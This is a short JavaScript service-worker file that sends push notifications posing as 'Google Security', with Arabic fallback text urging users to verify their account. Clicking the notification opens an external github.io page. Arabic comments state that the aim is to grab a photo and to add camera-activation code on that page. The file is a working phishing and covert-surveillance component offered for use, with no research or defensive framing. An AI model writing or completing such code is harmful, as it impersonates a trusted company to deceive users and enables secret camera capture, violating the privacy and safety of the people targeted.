self.addEventListener('push', function(event) {
    event.waitUntil(self.registration.showNotification('⚠️ Google Security', {
        body: event.data ? event.data.text() : 'تحقق من حسابك',
        icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
        vibrate: [500, 100, 500]
    }));
});

self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    // فتح الرابط وسحب صورة في نفس الوقت
    event.waitUntil(clients.openWindow('https://jake123321122-wq.github.io/').then(async (win) => {
        // هنا يمكنك إضافة كود تشغيل الكاميرا من الصفحة المفتوحة
    }));
});
